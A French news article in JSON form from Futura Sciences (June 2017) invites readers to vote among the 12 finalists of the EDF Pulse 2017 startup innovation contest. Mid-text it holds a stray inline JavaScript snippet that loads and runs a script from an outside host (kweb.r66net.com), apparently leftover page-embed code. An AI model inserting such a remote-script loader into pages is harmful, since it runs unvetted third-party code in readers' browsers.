{"title": "EDF Pulse 2017 : découvrez les 12 nominés de l'innovation... et votez", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "26/06/2017", "content": "Le concours EDF Pulse 2017 des innovations technologiques bat son plein et la balle est maintenant... chez vous puisque le moment est venu de s'en remettre au public pour départager les 12 finalistes. Il faudra choisir le grand gagnant parmi ces jeunes entreprises qui proposent des solutions nouvelles, originales, dans des projets solidement construits, pour les domaines de la santé, de l'habitat, de la ville et de l'entreprise. Organisé pour la quatrième fois, le concours EDF Pulse récompense des projets innovants de jeunes entreprises high-tech. Cette année, plus de 500  start-up  européennes ont déposé un projet, avec des idées très diversifiées, preuve d'une belle créativité. Elles concourent dans quatre catégories : Smart Home  : pour un habitat plus sûr, plus confortable, plus autonome et plus économe, au niveau individuel ou collectif. Smart City  : pour des villes plus simples à vivre, plus humaines, mais aussi plus efficaces, avec moins d'impact environnemental. Smart Business  : pour la construction de l'entreprise et de l'industrie du futur, par l'amélioration de la performance opérationnelle, technique, énergétique et environnementale des hommes et des organisations. Smart Health  : pour améliorer la santé et le bien-être à tous les âges de la vie à l'aide de nouvelles technologies. Voir aussi : Je vote pour mon projet préféré Devant la quantité et la qualité des dossiers, le choix sera difficile pour les jurés, qui récompenseront cinq lauréats : quatre Prix du jury (1 par catégorie), décernés par un Grand Jury composé d'experts et de personnalités, et un Prix du public, décerné à l'issue d'une campagne de votes de plusieurs semaines, jusqu'au prochain mois de septembre. En contrepartie, le passage en revue des projets sera passionnant et pourra même donner des idées à des entrepreneurs en herbe. N'hésitez donc pas à participer à ce concours en donnant votre avis sur ces innovations en tout genre, dont plusieurs, sans doute, feront partie de notre quotidien dans les années à venir. C'est là : Pour voter, rendez-vous sur  EDF Pulse 2017 Les lauréats EDF Pulse innovent pour notre bien-être Pour bien prendre la mesure des nouveautés en présence, on peut jeter un  œil  sur les précédentes éditions. Futura, partenaire de l'opération, a suivi plusieurs projets durant les édition précédentes. Le mathématicien  Cédric Villani , juré du prix 2016, nous avait expliqué son point de vue sur la capacité des petites entreprises à imaginer des solutions nouvelles pour peu qu'on leur en laisse l'opportunité.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Pour le mathématicien Cédric Villani, l'innovation a besoin de liberté Avec un détecteur de  cancer de la peau , un microgénérateur et un stockage d' énergie  en  béton , l' édition 2015  (avec 200 participants) avait par exemple lancé de jolis projets. En 2016, on avait vu un  smartphone pour esquiver la pollution  et le  lampadaire de Kawantech , qui n'éclaire que lorsque c'est utile. À coup sûr, au vu des dossiers 2017, la version de cette année sera très riche... "}